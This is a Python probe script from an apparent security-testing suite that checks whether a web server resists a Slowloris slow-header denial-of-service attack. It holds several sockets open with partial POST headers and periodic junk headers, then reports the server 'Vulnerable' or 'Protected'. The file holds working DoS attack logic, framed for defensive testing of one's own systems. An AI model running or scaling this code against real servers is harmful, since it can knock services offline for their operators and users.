"""
Probe script to test Slowloris / Slow Body DoS vulnerability.
WARNING: Run only against local/isolated environments.
"""

import socket
import ssl
import time
import sys
from urllib.parse import urlparse
from .base_probe import parse_args


def _initialize_sockets(parsed, host, port, count):
    sockets = []
    for _ in range(count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            if parsed.scheme == "https":
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            s.send(b"POST /api/business/health HTTP/1.1\r\n")
            s.send(f"Host: {host}\r\n".encode("utf-8"))
            s.send(
                b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            )
            s.send(b"Content-Length: 10000\r\n")
            sockets.append(s)
        except Exception as e:
            print(f"[-] Failed to create socket: {e}", file=sys.stderr)
            break
    return sockets


def _run_keep_alive_loop(sockets):
    start = time.time()
    for i in range(1, 6):
        print(
            f"[*] Loop {i}: Sending keep-alive to {len(sockets)} active sockets...",
            file=sys.stderr,
        )
        for s in list(sockets):
            try:
                s.send(b"X-a: b\r\n")
            except socket.error as e:
                print(
                    f"[-] Socket disconnected by server! ({e})",
                    file=sys.stderr,
                )
                sockets.remove(s)
        if not sockets:
            print(
                "[-] All sockets disconnected by server (Good!)",
                file=sys.stderr,
            )
            return False
        time.sleep(2)
    duration = time.time() - start
    print(
        f"[*] Test finished after {duration:.2f}s. Server still holding {len(sockets)} connections.",
        file=sys.stderr,
    )
    print(
        "[*] This means Slowloris IS EFFECTIVE (Bad) if this runs indefinitely, or Server accepts slow headers.",
        file=sys.stderr,
    )
    return True


def start_slowloris(url, count=5):
    """Simulate Slowloris attack by sending partial headers."""
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    print(
        f"[*] Attacking {host}:{port} with {count} sockets...",
        file=sys.stderr,
    )
    sockets = _initialize_sockets(parsed, host, port, count)
    print(
        "[*] Sockets created. sending garbage data every 2 seconds...",
        file=sys.stderr,
    )
    result = _run_keep_alive_loop(sockets)
    for s in sockets:
        s.close()
    return result

if __name__ == "__main__":
    # Custom runner since this isn't a BaseProbe class
    args = parse_args("Verify Slowloris defenses")
    result = start_slowloris(args.base_url)
    
    # Output simple JSON report
    import json
    report = {
        "probe_type": "SlowlorisProbe",
        "base_url": args.base_url,
        "results": [{
            "name": "Slowloris Connection Hold",
            "outcome": "Vulnerable" if result else "Protected/Disconnected",
            "details": "Sockets were held open for 10s" if result else "Sockets closed early"
        }]
    }
    if args.output:
        with open(args.output, "w") as f:
            json.dump(report, f, indent=2)
    else:
        print(json.dumps(report, indent=2))
